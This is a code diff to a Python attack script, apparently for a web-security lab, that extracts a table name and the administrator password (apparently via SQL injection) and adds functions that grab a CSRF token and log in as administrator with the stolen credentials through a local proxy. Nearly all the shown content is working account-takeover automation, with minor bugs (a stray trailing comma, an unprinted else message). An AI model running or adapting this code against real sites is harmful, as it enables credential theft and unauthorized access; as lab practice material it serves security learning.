@@ -7,7 +7,7 @@ import re
 #Disable warning
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-#Making request go through the proxy
+#Making request go through the proxy for debugging 
 proxy = {"http":"http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 #Change the category to something you have in the lab
@@ -66,6 +66,25 @@ def get_administrator_creds(res):
     return admin_password
 
 
+#Logging in as administrator
+def login_as_administrator(url, the_session):
+    csrf = get_csrf(url, the_session),
+    creds = {"csrf": csrf, "username":"administrator","password": administrator_password}
+    request = the_session.post(url + "/login", data=creds, verify=False, proxies=proxy)
+    if "Log out" in request.text:
+        return True
+    else:
+        return False
+
+#Getting csrf token to login
+def get_csrf(url, the_session):
+    uri = "/login"
+    request = the_session.get(url + uri, verify=False, proxies=proxy)
+    extracted_text = BeautifulSoup(request.text, "html.parser")
+    csrf_token = extracted_text.find("input", {"name":"csrf"})["value"]
+    return csrf_token
+
+
 if __name__ == "__main__":
     try:
         #Making sure the user provides the url
@@ -77,7 +96,8 @@ if __name__ == "__main__":
     except IndexError:
         print(f"[-] Usage: {sys.argv[0]} <url>")
         sys.exit(-1)
-    
+    the_session = requests.Session()
+
     users_table = get_table_name(url, middle_part)
     if users_table:
         print(f"Successfuly retrived table name: {users_table}")
@@ -92,6 +112,12 @@ if __name__ == "__main__":
             
             if administrator_password:
                 print(f"Successfully retrived administrator password: {administrator_password}")
+                print("Logging in as administrator...")
+                if login_as_administrator(url, the_session):
+                    print("Successfully logged in")
+                else:
+                    ("something went wrong")
+                
             
             else:
                 print("Couldn't find administrator password")
